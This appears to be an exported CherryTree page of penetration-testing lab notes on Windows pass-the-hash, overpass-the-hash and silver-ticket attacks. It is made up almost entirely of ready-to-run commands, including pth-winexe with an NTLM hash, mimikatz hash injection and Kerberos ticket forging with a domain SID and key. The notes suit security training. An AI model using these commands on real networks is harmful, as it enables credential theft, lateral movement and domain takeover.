<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>03- pass the hash/pass the ticket</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>03- pass the hash/pass the ticket</h1><br/><p><em><h2>Pass the hash</h2></em></p><p><ul><li>pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd</li></ul></p><p><ul><li>access shares<ul><li>smbclient \\$target\share -U $user --pw-nt-hash $pass</li></ul></li><li>rdp<ul><li>xfreerdp /pth:&lt;password-hash&gt;</li></ul></li></ul></p><p></p><p><em><h2>Over pass the hash</h2></em><ul><li>goal : retreive TGT from NTLM hash </li><li>unlike pass the hash were we pass by the Network for an NTLM authentication</li><li>mimikatz <ul><li>sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe </li></ul></li><li>test<ul><li>net use \\dc01</li><li>klist</li><li>we can use psexec which relies on kerberoast </li><li>./PSexec \\dc01 cmd.exe</li></ul></li></ul></p><p></p><p></p><p></p><p><em><h2>Pass the ticket(silver ticket)</h2></em><ul><li>export TGS and inject somewhere else in the network</li><li>no admin privs is required</li><li>mimikatz<ul><li>kerberos::purge</li><li>kerberos::list</li><li>kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt</li><li>kerberos::list </li></ul></li></ul></p><p></p><p></p></div>
</body>
</html>
